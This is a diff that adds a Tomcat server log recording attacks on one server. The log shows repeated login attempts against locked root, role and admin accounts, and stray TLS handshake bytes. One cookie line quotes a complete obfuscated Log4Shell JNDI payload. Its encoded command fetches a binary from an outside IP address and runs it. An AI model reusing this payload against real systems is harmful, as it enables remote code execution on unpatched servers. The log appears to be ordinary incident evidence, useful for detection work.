@@ -1,0 +1,46 @@
+29-Dec-2021 07:52:46.902 WARNING [http-nio-8081-exec-3] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [root]
+29-Dec-2021 07:52:47.103 WARNING [http-nio-8081-exec-5] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [root]
+29-Dec-2021 07:52:47.304 WARNING [http-nio-8081-exec-2] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [root]
+29-Dec-2021 07:52:48.305 WARNING [http-nio-8081-exec-1] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [role]
+29-Dec-2021 07:52:48.504 WARNING [http-nio-8081-exec-6] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [role]
+29-Dec-2021 07:52:48.704 WARNING [http-nio-8081-exec-3] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [role]
+29-Dec-2021 07:52:49.705 WARNING [http-nio-8081-exec-4] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [admin]
+29-Dec-2021 07:52:49.905 WARNING [http-nio-8081-exec-8] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [admin]
+29-Dec-2021 07:52:50.105 WARNING [http-nio-8081-exec-1] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [admin]
+29-Dec-2021 11:04:14.408 INFO [http-nio-8081-exec-9] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xaf0x010x000x000xab0x030x030xdc~t0xb20xfc0xf20x9c00x0e0x9a0xbd0xbb0x9b0xd80xa2qq.0xf20xb70xde'B0xfey0x88 ]. HTTP method names must be tokens
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:434)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:511)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:831)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1673)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.lang.Thread.run(Thread.java:748)
+29-Dec-2021 18:05:37.895 INFO [http-nio-8081-exec-9] org.apache.tomcat.util.http.parser.Cookie.logInvalidHeader A cookie header was received [('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//2.58.149.206:1389/Deserialization/CommonsCollectionsK2/Command/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}')] that contained an invalid cookie. That cookie will be ignored.
+ Note: further occurrences of this error will be logged at DEBUG level.
+29-Dec-2021 22:03:52.438 WARNING [http-nio-8081-exec-3] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [root]
+29-Dec-2021 22:03:52.598 WARNING [http-nio-8081-exec-5] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [root]
+29-Dec-2021 22:03:52.756 WARNING [http-nio-8081-exec-2] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [root]
+29-Dec-2021 22:03:53.546 WARNING [http-nio-8081-exec-6] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [role]
+29-Dec-2021 22:03:53.704 WARNING [http-nio-8081-exec-3] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [role]
+29-Dec-2021 22:03:53.863 WARNING [http-nio-8081-exec-5] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [role]
+29-Dec-2021 22:03:54.658 WARNING [http-nio-8081-exec-8] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [admin]
+29-Dec-2021 22:03:54.816 WARNING [http-nio-8081-exec-6] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [admin]
+29-Dec-2021 22:03:54.974 WARNING [http-nio-8081-exec-3] org.apache.catalina.realm.LockOutRealm.filterLockedAccounts An attempt was made to authenticate the locked user [admin]
+29-Dec-2021 23:01:22.757 INFO [http-nio-8081-exec-5] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000x8a0x010x000x000x860x030x03[C*0x180xf4a0xdb0x0d0xd40xd4ny0xd30x860xb70xa450xe8bR0xda0x130x130xbd0x7f0xb30x930xf80x0e0x880x8ce0x000x000x1a0xc0/0xc0+0xc00x110xc00x070xc00x130xc00x090xc00x140xc00x0a0x000x050x00/0x0050xc00x120x000x0a0x010x000x00C0x000x000x000x110x000x0f0x000x000x0c35.183.45.680x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x0a0x000x080x040x010x040x030x020x010x020x030xff0x010x000x010x00...]. HTTP method names must be tokens
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:434)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:511)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:831)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1673)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.lang.Thread.run(Thread.java:748)
